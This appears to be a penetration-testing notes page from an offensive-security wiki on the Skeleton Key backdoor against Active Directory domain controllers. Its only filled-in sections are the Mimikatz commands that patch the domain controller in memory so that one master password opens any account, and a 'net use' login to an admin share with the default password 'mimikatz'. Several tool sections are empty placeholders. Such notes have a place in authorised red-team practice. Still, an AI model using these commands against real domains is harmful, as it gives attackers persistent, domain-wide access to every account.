---
description: Escalate privileges on a Domain using skeleton keys
coverY: 0
---

# 🔥 Skeleton Keys

## Do Not play GOD without Permission!

• The Skeleton Key only works for Kerberos **RC4 encryption**;&#x20;

• The Skeleton Key is a backdoor that runs on the **Domain Controller** (**in memory**) and allows single password (the skeleton password) that can be used to log on to any account;

• As it runs in memory, it does not persist by itself (but can, of course, be scripted or persisted)

### What is a Skeleton Key?

### What permissions do I need to generate a Skeleton Key?

Domain Admin

### MimiKatz

```
privilege::debug
misc::skeleton
```

```
net use p: \\WIN-MACHINE01\admin$ /user:rfs mimikatz
```

#### Run on Windows CMD

```
mimikatz.exe "privilege::debug" "misc::skeleton" exit
```

### Empire

```
// Some code
```

### Metasploit

```
// Some code
```

### CrackMapExec

```
// Some code
```

### LSA Protection ByPASS

### Articles

{% embed url="https://pentestlab.blog/2018/04/10/skeleton-key/" %}

{% embed url="https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/" %}

{% embed url="https://adsecurity.org/?p=1275" %}

### Videos

{% embed url="https://www.youtube.com/watch?v=b6GUXerE9Ac" %}
